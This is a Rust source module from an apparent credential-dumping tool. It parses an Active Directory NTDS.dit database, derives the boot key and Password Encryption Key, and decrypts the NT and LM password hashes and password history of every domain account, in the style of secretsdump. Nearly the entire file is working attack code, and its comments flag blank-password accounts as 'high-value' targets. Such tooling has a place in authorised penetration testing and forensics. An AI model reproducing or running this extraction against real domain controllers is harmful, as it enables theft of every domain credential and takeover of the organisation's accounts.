//! Native NTDS.dit AD secrets extraction.
//!
//! Parses the ESE database (ntds.dit) directly to extract AD account
//! NTLM hashes without any external dependencies.
//!
//! Flow: ESE parse -> datatable rows -> PEK decrypt -> DES unwrap -> hashes

pub mod ese;

use crate::error::{Result, VmkatzError};
use crate::sam::hashes::{aes128_cbc_decrypt, des_unwrap_hash, md5_hash, rc4};
use ese::EseDb;
use std::collections::{HashMap, HashSet};

type DomainSidMap = HashMap<Vec<u8>, String>;

/// High-level NTDS context extracted from disk artifacts.
#[derive(Debug, Clone)]
pub struct NtdsContext {
    pub ntds_size: usize,
    pub boot_key: [u8; 16],
}

/// datatable column holding unicodePwd (the NT hash). Matches impacket's NTHASH.
const COL_UNICODE_PWD: &str = "ATTk589914";
/// datatable column holding dBCSPwd (the LM hash; empty on modern AD).
const COL_DBCS_PWD: &str = "ATTk589879";
const COL_SAM_ACCOUNT_NAME: &str = "ATTm590045";
const COL_OBJECT_SID: &str = "ATTr589970";
const COL_PEK_LIST: &str = "ATTk590689";
const COL_NT_PASSWORD_HISTORY: &str = "ATTk589918";
const COL_LM_PASSWORD_HISTORY: &str = "ATTk589984";
/// datatable column holding sAMAccountType — distinguishes real security
/// principals (user/machine/trust) from groups/aliases/other objects.
const COL_SAM_ACCOUNT_TYPE: &str = "ATTj590126";
const COL_SCHEMA_ATTRIBUTE_ID: &str = "ATTc131102";
const COL_SCHEMA_LDAP_NAME: &str = "ATTm131532";

/// NT hash of the empty password (shown for accounts with no stored unicodePwd,
/// matching impacket secretsdump). A blank-password account is high-value, so it
/// must appear rather than be silently dropped.
const EMPTY_NT: [u8; 16] = [
    0x31, 0xd6, 0xcf, 0xe0, 0xd1, 0x6a, 0xe9, 0x31, 0xb7, 0x3c, 0x59, 0xd7, 0xe0, 0xc0, 0x89, 0xc0,
];
/// LM hash of the empty password.
const EMPTY_LM: [u8; 16] = [
    0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee, 0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee,
];

/// SAM account types that denote a credential-bearing principal.
const SAM_ACCOUNT_TYPES: std::ops::RangeInclusive<u32> = 0x3000_0000..=0x3000_0002; // user, machine, trust

/// A single AD NTLM hash entry extracted from NTDS.
#[derive(Debug, Clone)]
pub struct AdHashEntry {
    pub username: String,
    /// NetBIOS domain proven by matching the account SID to an LDAP crossRef.
    pub domain: Option<String>,
    pub rid: u32,
    pub lm_hash: [u8; 16],
    pub nt_hash: [u8; 16],
    pub is_history: bool,
    pub history_index: Option<u32>,
}

/// Build NTDS context from raw NTDS.dit + SYSTEM hive bytes.
pub fn build_context(ntds_data: &[u8], system_data: &[u8]) -> Result<NtdsContext> {
    if !is_ese_database(ntds_data) {
        return Err(VmkatzError::DecryptionError(
            "NTDS.dit does not look like a valid ESE database".to_string(),
        ));
    }

    let boot_key = crate::sam::bootkey::extract_bootkey(system_data)?;
    Ok(NtdsContext {
        ntds_size: ntds_data.len(),
        boot_key,
    })
}

/// Minimal ESE validity check for NTDS.dit.
fn is_ese_database(data: &[u8]) -> bool {
    if data.len() < 8 {
        return false;
    }
    data[4..8] == [0xEF, 0xCD, 0xAB, 0x89]
}

/// Extract AD NTLM hashes from NTDS + SYSTEM natively.
pub fn extract_ad_hashes(
    ntds_data: &[u8],
    system_data: &[u8],
    include_history: bool,
) -> Result<Vec<AdHashEntry>> {
    let ctx = build_context(ntds_data, system_data)?;
    let db = EseDb::open(ntds_data)?;

    // Log available tables for debugging
    let tables = db.table_names();
    log::info!("NTDS tables: {tables:?}");

    // The main table is "datatable"
    let columns = db.columns("datatable").ok_or_else(|| {
        VmkatzError::DecryptionError("datatable not found in NTDS.dit".to_string())
    })?;

    log::info!("datatable has {} columns", columns.len());
    // Find relevant column names (AD attribute IDs)
    // The NTDS.dit datatable uses column names like:
    //   ATTm590045 = sAMAccountName
    //   ATTk589914 = unicodePwd (NT hash, encrypted)
    //   ATTk589879 = dBCSPwd (LM hash, encrypted)
    //   ATTr589970 = objectSid
    //   ATTk590689 = pekList (Password Encryption Key)
    //   ATTk589918 = ntPwdHistory
    //   ATTk589984 = lmPwdHistory

    // First pass: extract PEK (Password Encryption Key)
    let (pek, domain_by_sid) = extract_pek_and_domain(&db, &ctx.boot_key)?;
    log::info!("PEK decrypted: {} bytes", pek.len());
    log::info!("NTDS domain SID mappings: {}", domain_by_sid.len());

    // Second pass: extract user hashes
    let mut entries = Vec::new();
    let mut rows_seen = 0usize;
    let mut skipped_no_name = 0usize;
    let mut skipped_no_sid = 0usize;
    let mut skipped_non_account = 0usize;

    db.for_each_row("datatable", |read_col| {
        rows_seen += 1;
        // Read sAMAccountName
        let username = if let Some(data) = read_col(COL_SAM_ACCOUNT_NAME) {
            decode_ad_string(&data)
        } else {
            skipped_no_name += 1;
            return;
        };
        // Read objectSid to get RID
        let Some(sid) = read_col(COL_OBJECT_SID) else {
            skipped_no_sid += 1;
            return;
        };
        let Some((rid, domain_sid)) = split_sid_rid(&sid) else {
            skipped_no_sid += 1;
            return;
        };
        // UPN suffixes can be alternate login suffixes and do not prove the
        // account's domain. Only label it when its SID matches an LDAP domain SID.
        let domain = domain_by_sid.get(domain_sid.as_slice()).cloned();

        // Read encrypted NT hash (unicodePwd) and LM hash (dBCSPwd). unicodePwd is
        // absent for accounts that never set a password (disabled, trust, etc.).
        let zero = [0u8; 16];
        let (nt_raw, nt_present) = match read_col(COL_UNICODE_PWD) {
            Some(data) => match decrypt_ad_hash(&data, &pek, rid) {
                Ok(hash) => (hash, true),
                Err(error) => {
                    log::debug!(
                        "ntds: unicodePwd decrypt failed for rid={rid} ({username}): {error}"
                    );
                    (zero, true)
                }
            },
            None => (zero, false),
        };
        let (lm_raw, lm_present) = match read_col(COL_DBCS_PWD) {
            Some(data) => match decrypt_ad_hash(&data, &pek, rid) {
                Ok(hash) => (hash, true),
                Err(error) => {
                    log::debug!("ntds: dBCSPwd decrypt failed for rid={rid} ({username}): {error}");
                    (zero, true)
                }
            },
            None => (zero, false),
        };

        // sAMAccountType gates credential-bearing principals (user/machine/trust)
        // from groups/aliases/other objects, exactly as impacket secretsdump does.
        let sam_type =
            read_col(COL_SAM_ACCOUNT_TYPE).and_then(|d| crate::utils::read_u32_le(&d, 0));
        let is_account = matches!(sam_type, Some(t) if SAM_ACCOUNT_TYPES.contains(&t));
        let has_hash = nt_raw != zero || lm_raw != zero;

        // Keep EVERY account, including those with no stored password. Dropping
        // null-hash accounts silently lost "a large number of entries" vs
        // secretsdump on real DCs (disabled/never-logged-on/trust accounts), and
        // a blank-password account (NT 31d6cfe0…) is high-value. Only skip a
        // non-account object that also carries no hash at all.
        if !has_hash && !is_account {
            skipped_non_account += 1;
            return;
        }

        // Columns map directly per the AD schema: unicodePwd (ATTk589914) is the
        // NT hash, dBCSPwd (ATTk589879) is the LM hash. Never relabel dBCSPwd as
        // NT. Only an absent hash column means there is no stored password and
        // should be represented by the empty-password hash. Failed decryptions
        // stay zero rather than being misreported as blank passwords.
        let nt_hash = if nt_present { nt_raw } else { EMPTY_NT };
        let lm_hash = if lm_present { lm_raw } else { EMPTY_LM };

        entries.push(AdHashEntry {
            username: username.clone(),
            domain: domain.clone(),
            rid,
            lm_hash,
            nt_hash,
            is_history: false,
            history_index: None,
        });

        // Password history
        if include_history {
            let nt_history = match read_col(COL_NT_PASSWORD_HISTORY) {
                Some(data) => match decrypt_hash_history(&data, &pek, rid) {
                    Ok(history) => history,
                    Err(error) => {
                        log::debug!("ntds: NT password history decrypt failed for rid={rid} ({username}): {error}");
                        Vec::new()
                    }
                },
                None => Vec::new(),
            };
            let lm_history = match read_col(COL_LM_PASSWORD_HISTORY) {
                Some(data) => match decrypt_hash_history(&data, &pek, rid) {
                    Ok(history) => history,
                    Err(error) => {
                        log::debug!("ntds: LM password history decrypt failed for rid={rid} ({username}): {error}");
                        Vec::new()
                    }
                },
                None => Vec::new(),
            };

            // Merge each account's NT and LM history before appending it. A
            // global username/index search could attach LM history to a
            // different account with the same sAMAccountName.
            let history_len = nt_history.len().max(lm_history.len());
            for i in 0..history_len {
                entries.push(AdHashEntry {
                    username: username.clone(),
                    domain: domain.clone(),
                    rid,
                    lm_hash: lm_history.get(i).copied().unwrap_or(zero),
                    nt_hash: nt_history.get(i).copied().unwrap_or(zero),
                    is_history: true,
                    history_index: Some(i as u32),
                });
            }
        }
    })?;

    log::info!(
        "NTDS datatable rows: seen={rows_seen}, emitted={}, no_name={skipped_no_name}, no_sid={skipped_no_sid}, non_account_without_hash={skipped_non_account}",
        entries.iter().filter(|e| !e.is_history).count()
    );

    if entries.is_empty() {
        return Err(VmkatzError::DecryptionError(
            "No AD hashes found in NTDS.dit datatable".to_string(),
        ));
    }

    // Sort by RID
    entries.sort_by_key(|e| (e.rid, e.is_history, e.history_index));

    log::info!("Extracted {} AD hash entries", entries.len());
    Ok(entries)
}

/// Extract the PEK and map unambiguous domain-root SIDs to crossRef NetBIOS names.
fn extract_pek_and_domain(db: &EseDb<'_>, boot_key: &[u8; 16]) -> Result<(Vec<u8>, DomainSidMap)> {
    let mut pek_data: Option<Vec<u8>> = None;
    let mut schema_ids = HashMap::<String, u32>::new();

    // Schema objects map ATT attribute IDs to LDAP display names. This avoids
    // guessing ATT numbers for crossRef/domain attributes in a particular AD.
    db.for_each_row("datatable", |read_col| {
        let Some(id_bytes) = read_col(COL_SCHEMA_ATTRIBUTE_ID) else {
            return;
        };
        let Some(name_bytes) = read_col(COL_SCHEMA_LDAP_NAME) else {
            return;
        };
        let Some(id) = crate::utils::read_u32_le(&id_bytes, 0) else {
            return;
        };
        let name = decode_ad_string(&name_bytes).to_ascii_lowercase();
        if ["netbiosname", "dnsroot", "name"].contains(&name.as_str()) {
            schema_ids.insert(name, id);
        }
    })?;

    let columns = db.columns("datatable").ok_or_else(|| {
        VmkatzError::DecryptionError("datatable not found in NTDS.dit".to_string())
    })?;
    let domain_columns = ["netbiosname", "dnsroot", "name"]
        .into_iter()
        .filter_map(|name| {
            schema_ids
                .get(name)
                .and_then(|id| find_att_column(columns, *id))
                .map(|att| (name.to_string(), att.to_string()))
        })
        .collect::<Vec<_>>();
    // Keep the DNS root as part of the identity. A set containing only
    // nETBIOSName would collapse two crossRefs with the same NetBIOS label
    // into one entry and make an ambiguous mapping look unique.
    let mut crossrefs_by_netbios = HashMap::<String, HashMap<String, String>>::new();
    let mut sids_by_name = HashMap::<String, HashSet<Vec<u8>>>::new();

    log::debug!("NTDS domain schema columns: {domain_columns:?}");

    db.for_each_row("datatable", |read_col| {
        if pek_data.is_none() {
            if let Some(data) = read_col(COL_PEK_LIST) {
                if data.len() > 16 {
                    pek_data = Some(data);
                }
            }
        }
        if !domain_columns.is_empty() {
            let values = domain_columns
                .iter()
                .filter_map(|(name, att)| {
                    read_col(att).map(|v| (name.as_str(), decode_ad_string(&v)))
                })
                .collect::<Vec<_>>();
            let text = |key: &str| {
                values
                    .iter()
                    .find(|(name, _)| *name == key)
                    .map(|(_, value)| value.trim().trim_end_matches('\0').to_string())
                    .filter(|v| !v.is_empty())
            };
            if let (Some(name), Some(sid)) = (text("name"), read_col(COL_OBJECT_SID)) {
                // A domain root SID has no account RID (four sub-authorities
                // for the common S-1-5-21-x-y-z form).
                if is_valid_sid(&sid) && sid[1] == 4 {
                    sids_by_name
                        .entry(name.to_ascii_lowercase())
                        .or_default()
                        .insert(sid);
                }
            }
            if let (Some(dns), Some(netbios)) = (text("dnsroot"), text("netbiosname")) {
                crossrefs_by_netbios
                    .entry(netbios.to_ascii_lowercase())
                    .or_default()
                    .entry(dns.to_ascii_lowercase())
                    .or_insert(netbios);
            }
        }
    })?;

    let mut domain_by_sid = HashMap::new();
    let mut ambiguous_sids = std::collections::HashSet::new();
    // Match a domain-root object SID/name to the unique LDAP crossRef
    // nETBIOSName. UPN suffixes are deliberately not used as domain evidence.
    for (name, sids) in sids_by_name {
        if sids.len() != 1 {
            continue;
        }
        let Some(domains_by_dns) = crossrefs_by_netbios
            .get(&name)
            .filter(|domains| domains.len() == 1)
        else {
            continue;
        };
        let Some(sid) = sids.into_iter().next() else {
            continue;
        };
        let Some(domain) = domains_by_dns.values().next() else {
            continue;
        };
        if let Some(previous) = domain_by_sid.get(sid.as_slice()) {
            if previous != domain {
                ambiguous_sids.insert(sid);
            }
        } else {
            domain_by_sid.insert(sid, domain.clone());
        }
    }
    for sid in ambiguous_sids {
        domain_by_sid.remove(&sid);
    }

    let pek_encrypted = pek_data.ok_or_else(|| {
        VmkatzError::DecryptionError(format!("PEK ({COL_PEK_LIST}) not found in datatable"))
    })?;

    Ok((decrypt_pek(&pek_encrypted, boot_key)?, domain_by_sid))
}

/// Derive the RC4 key for PEK decryption: MD5(bootkey + key_salt * 1000).
/// Used by both PEK v1 and v2.
fn derive_pek_rc4_key(boot_key: &[u8; 16], key_salt: &[u8]) -> [u8; 16] {
    let mut md5_input = Vec::with_capacity(16 + key_salt.len() * 1000);
    md5_input.extend_from_slice(boot_key);
    for _ in 0..1000 {
        md5_input.extend_from_slice(key_salt);
    }
    md5_hash(&md5_input)
}

/// Decrypt the PEK blob using the bootkey.
///
/// PEK format v1 (RC4, Win2003): header(8) + key_salt(16) + encrypted(rest)
///   Decrypted layout: header(4) + key(16)
///
/// PEK format v2 (RC4, Vista+): header(8) + key_salt(16) + encrypted(rest)
///   Decrypted layout: header(4) + padding(32) + key(16)
///
/// PEK format v3 (AES, Win2016+): header(8) + salt(16) + encrypted(rest)
///   AES-128-CBC with bootkey as key and salt as IV
fn decrypt_pek(pek_blob: &[u8], boot_key: &[u8; 16]) -> Result<Vec<u8>> {
    if pek_blob.len() < 24 {
        return Err(VmkatzError::DecryptionError(
            "PEK blob too short".to_string(),
        ));
    }

    // Version at offset 0 (first 4 bytes)
    let version = u32::from_le_bytes([pek_blob[0], pek_blob[1], pek_blob[2], pek_blob[3]]);
    log::info!("PEK version: {version}");

    match version {
        0x01 => {
            // PEK v1 (Win2003): RC4-based, smaller decrypted structure
            // Structure: version(4) + flags(4) + key_salt(16) + encrypted_pek(rest)
            // Min size: 24 (header+salt) + 20 (header(4) + key(16))
            if pek_blob.len() < 24 + 20 {
                return Err(VmkatzError::DecryptionError(
                    "PEK v1 blob too short".to_string(),
                ));
            }

            let key_salt = &pek_blob[8..24];
            let rc4_key = derive_pek_rc4_key(boot_key, key_salt);
            let decrypted = rc4(&rc4_key, &pek_blob[24..]);

            // v1 decrypted layout: header(4) + key(16)
            if decrypted.len() < 20 {
                return Err(VmkatzError::DecryptionError(
                    "Decrypted PEK v1 too short".to_string(),
                ));
            }

            // Skip 4-byte header, take 16-byte key
            Ok(decrypted[4..20].to_vec())
        }
        0x02 => {
            // PEK v2 (Vista+): RC4-based, larger decrypted structure
            // Structure: version(4) + flags(4) + key_salt(16) + encrypted_pek(rest)
            // Min size: 24 (header+salt) + 76 (header(4) + padding(32) + key(16) + extra(24))
            if pek_blob.len() < 24 + 76 {
                return Err(VmkatzError::DecryptionError(
                    "PEK v2 blob too short".to_string(),
                ));
            }

            let key_salt = &pek_blob[8..24];
            let rc4_key = derive_pek_rc4_key(boot_key, key_salt);
            let decrypted = rc4(&rc4_key, &pek_blob[24..]);

            // v2 decrypted layout: header(4) + padding(32) + key(16)
            if decrypted.len() < 52 {
                return Err(VmkatzError::DecryptionError(
                    "Decrypted PEK v2 too short".to_string(),
                ));
            }

            // Skip 36-byte header, take 16-byte key
            Ok(decrypted[36..52].to_vec())
        }
        0x03 => {
            // PEK v3: AES-256-CBC
            // Structure: version(4) + flags(4) + salt(16) + encrypted(rest)
            if pek_blob.len() < 24 + 32 {
                return Err(VmkatzError::DecryptionError(
                    "PEK v3 blob too short".to_string(),
                ));
            }

            let salt = &pek_blob[8..24];
            let encrypted = &pek_blob[24..];

            // AES key derived from bootkey
            // For PEK v3, the AES key IS the bootkey (zero-padded to 32 bytes for AES-256)
            // Actually it uses AES-128-CBC with the bootkey as key and salt as IV
            let decrypted = aes128_cbc_decrypt(boot_key, salt, encrypted)?;

            if decrypted.len() < 52 {
                return Err(VmkatzError::DecryptionError(
                    "Decrypted PEK v3 too short".to_string(),
                ));
            }

            Ok(decrypted[36..52].to_vec())
        }
        _ => Err(VmkatzError::DecryptionError(format!(
            "Unknown PEK version: {version}"
        ))),
    }
}

/// Decrypt an individual AD hash (NT or LM) using the PEK.
///
/// Hash blob format v1 (RC4):
///   version(4)=0x01 + padding(4) + salt(16) + encrypted_hash(16+)
///   RC4(MD5(pek + salt)) -> decrypt -> DES unwrap with RID
///
/// Hash blob format v2 (AES, pre-Win2016):
///   version(4)=0x02 + padding(4) + salt(16) + encrypted_hash(rest)
///   AES-128-CBC(pek, salt) -> decrypt -> DES unwrap with RID
///
/// Hash blob format v3 (AES, Win2016+):
///   version(4)=0x13 + padding(4) + salt(16) + data_len(4) + encrypted_hash(rest)
///   AES-128-CBC(pek, salt) -> decrypt -> DES unwrap with RID
fn decrypt_ad_hash(hash_blob: &[u8], pek: &[u8], rid: u32) -> Result<[u8; 16]> {
    if hash_blob.len() < 24 {
        return Ok([0u8; 16]); // Too short, treat as empty
    }

    let version = u32::from_le_bytes([hash_blob[0], hash_blob[1], hash_blob[2], hash_blob[3]]);

    let decrypted = match version {
        0x01 => {
            // RC4-based (legacy)
            if hash_blob.len() < 40 {
                return Ok([0u8; 16]);
            }
            let salt = &hash_blob[8..24];
            let encrypted = &hash_blob[24..];

            // RC4 key = MD5(PEK + salt)
            let mut md5_input = Vec::new();
            md5_input.extend_from_slice(pek);
            md5_input.extend_from_slice(salt);
            let rc4_key = md5_hash(&md5_input);

            rc4(&rc4_key, encrypted)
        }
        0x02 => {
            // AES-based (pre-Win2016)
            if hash_blob.len() < 40 {
                return Ok([0u8; 16]);
            }
            let salt = &hash_blob[8..24];
            let encrypted = &hash_blob[24..];

            aes128_cbc_decrypt(pek, salt, encrypted)?
        }
        0x13 => {
            // AES-based (Win2016+ TP4)
            // Structure: version(4) + padding(4) + salt(16) + data_len(4) + encrypted(rest)
            if hash_blob.len() < 32 {
                return Ok([0u8; 16]);
            }
            let salt = &hash_blob[8..24];
            // data_len at offset 24 tells us the plaintext length (usually 16)
            let encrypted = &hash_blob[28..];

            aes128_cbc_decrypt(pek, salt, encrypted)?
        }
        _ => {
            log::debug!(
                "Unknown hash version: 0x{:08x}, blob_len={}",
                version,
                hash_blob.len()
            );
            return Ok([0u8; 16]);
        }
    };

    if decrypted.len() < 16 {
        return Ok([0u8; 16]);
    }

    // DES unwrap with RID (same as SAM hash unwrapping)
    des_unwrap_hash(&decrypted[..16], rid)
}

/// Decrypt password history blob.
/// Decrypted data contains concatenated 16-byte hashes.
fn decrypt_hash_history(blob: &[u8], pek: &[u8], rid: u32) -> Result<Vec<[u8; 16]>> {
    if blob.len() < 24 {
        return Ok(Vec::new());
    }

    let version = u32::from_le_bytes([blob[0], blob[1], blob[2], blob[3]]);

    let decrypted = match version {
        0x01 => {
            let salt = &blob[8..24];
            let encrypted = &blob[24..];
            let mut md5_input = Vec::new();
            md5_input.extend_from_slice(pek);
            md5_input.extend_from_slice(salt);
            let rc4_key = md5_hash(&md5_input);
            rc4(&rc4_key, encrypted)
        }
        0x02 => {
            let salt = &blob[8..24];
            let encrypted = &blob[24..];
            aes128_cbc_decrypt(pek, salt, encrypted)?
        }
        0x13 => {
            // Win2016+ AES: version(4) + padding(4) + salt(16) + data_len(4) + encrypted(rest)
            if blob.len() < 32 {
                return Ok(Vec::new());
            }
            let salt = &blob[8..24];
            let encrypted = &blob[28..];
            aes128_cbc_decrypt(pek, salt, encrypted)?
        }
        _ => return Ok(Vec::new()),
    };

    let mut hashes = Vec::new();
    let mut offset = 0;
    while offset + 16 <= decrypted.len() {
        let raw = &decrypted[offset..offset + 16];
        if let Ok(h) = des_unwrap_hash(raw, rid) {
            if h != [0u8; 16] {
                hashes.push(h);
            }
        }
        offset += 16;
    }

    Ok(hashes)
}

/// Decode an AD string (UTF-16LE typically).
fn decode_ad_string(data: &[u8]) -> String {
    if data.is_empty() {
        return String::new();
    }
    // ESE Text columns can use an ANSI/UTF-8-compatible codepage or UTF-16LE.
    // Trying UTF-16 first solely because the byte length is even turns values
    // such as even-length ASCII attribute values into plausible CJK characters.
    // Prefer valid control-free UTF-8;
    // UTF-16LE ASCII contains NUL controls and therefore falls through.
    if let Ok(s) = std::str::from_utf8(data) {
        let s = s.trim_end_matches('\0');
        if !s.is_empty() && s.chars().all(|c| !c.is_control() || c == '\n' || c == '\r') {
            return s.to_string();
        }
    }
    if data.len() >= 2 && data.len().is_multiple_of(2) {
        let s = crate::utils::utf16le_decode(data);
        if !s.is_empty() && s.chars().all(|c| !c.is_control() || c == '\n' || c == '\r') {
            return s;
        }
    }
    // Lossy fallback for legacy/non-UTF-8 codepages.
    String::from_utf8_lossy(data)
        .trim_end_matches('\0')
        .to_string()
}

/// Find a datatable column by its numeric schema attribute ID.
/// Column names are `ATT` + type code + decimal ID; parse the whole suffix so
/// IDs such as `3102` cannot accidentally match a column ending in `13102`.
fn find_att_column(columns: &[ese::EseColumn], attribute_id: u32) -> Option<&str> {
    columns.iter().find_map(|column| {
        let suffix = column.name.strip_prefix("ATT")?.get(1..)?;
        (suffix.parse::<u32>().ok() == Some(attribute_id)).then_some(column.name.as_str())
    })
}

/// Return the final RID and a valid domain SID derived from an object SID.
fn split_sid_rid(sid: &[u8]) -> Option<(u32, Vec<u8>)> {
    if !is_valid_sid(sid) || sid.len() < 12 {
        return None;
    }
    let rid_offset = sid.len().checked_sub(4)?;
    let rid = extract_rid_from_sid(sid)?;
    let mut domain_sid = sid[..rid_offset].to_vec();
    domain_sid[1] -= 1;
    Some((rid, domain_sid))
}

fn is_valid_sid(sid: &[u8]) -> bool {
    sid.len() >= 8 && sid[0] == 1 && sid.len() == 8 + usize::from(sid[1]) * 4
}

/// Extract the RID (last sub-authority) from a Windows SID binary blob.
fn extract_rid_from_sid(sid: &[u8]) -> Option<u32> {
    // SID binary format:
    //   byte 0: revision (1)
    //   byte 1: sub-authority count
    //   bytes 2-7: identifier authority (6 bytes, big-endian)
    //   bytes 8+: sub-authorities, 4 bytes each
    // RID is the last sub-authority.
    //
    // NOTE: in the NTDS.dit `objectSid`, the sub-authorities are stored
    // BIG-ENDIAN (impacket decodes them with `SAMR_RPC_SID`, i.e. `>L`), unlike
    // a wire/API SID. Decoding this blob little-endian byte-swaps the RID (e.g.
    // 1000 -> 0xE8030000), producing wrong DES keys and garbage NT/LM hashes.
    if !is_valid_sid(sid) {
        return None;
    }
    let sub_auth_count = sid[1] as usize;
    if sub_auth_count == 0 {
        return None;
    }
    let rid_offset = 8 + (sub_auth_count - 1) * 4;
    let rid_bytes: [u8; 4] = sid.get(rid_offset..rid_offset + 4)?.try_into().ok()?;

    Some(u32::from_be_bytes(rid_bytes))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn nt_and_lm_columns_match_ad_schema() {
        // Regression: these were swapped, so the real NT hash was printed as LM
        // and NT came out all-zero (modern AD leaves dBCSPwd empty).
        // Reference: impacket secretsdump NTDS.NAME_TO_INTERNAL.
        assert_eq!(COL_UNICODE_PWD, "ATTk589914");
        assert_eq!(COL_DBCS_PWD, "ATTk589879");
    }

    #[test]
    fn sid_split_returns_domain_sid_and_rid() {
        // NTDS `objectSid` stores sub-authorities big-endian (impacket `>L`).
        let mut sid = vec![1, 5, 0, 0, 0, 0, 0, 5];
        sid.extend(
            [21u32, 11, 22, 33, 1104]
                .into_iter()
                .flat_map(u32::to_be_bytes),
        );
        let (rid, domain_sid) = split_sid_rid(&sid).unwrap();
        assert_eq!(rid, 1104);
        assert_eq!(domain_sid.len(), sid.len() - 4);
        assert_eq!(domain_sid[1], sid[1] - 1);
        assert_eq!(split_sid_rid(&sid[..sid.len() - 1]), None);
    }

    #[test]
    fn sid_rid_decodes_big_endian() {
        // Regression: decoding NTDS objectSid sub-authorities little-endian
        // byte-swaps the RID (1000 -> 0xE8030000), corrupting every NT/LM hash.
        let rid_le = |rid: u32| {
            let mut sid = vec![1u8, 5, 0, 0, 0, 0, 0, 5];
            sid.extend(
                [21u32, 11, 22, 33, rid]
                    .into_iter()
                    .flat_map(u32::to_be_bytes),
            );
            extract_rid_from_sid(&sid)
        };
        assert_eq!(rid_le(1000), Some(1000)); // vagrant / common low RID
        assert_eq!(rid_le(0x1000_0000), Some(0x1000_0000)); // large RID, no swap
    }
}
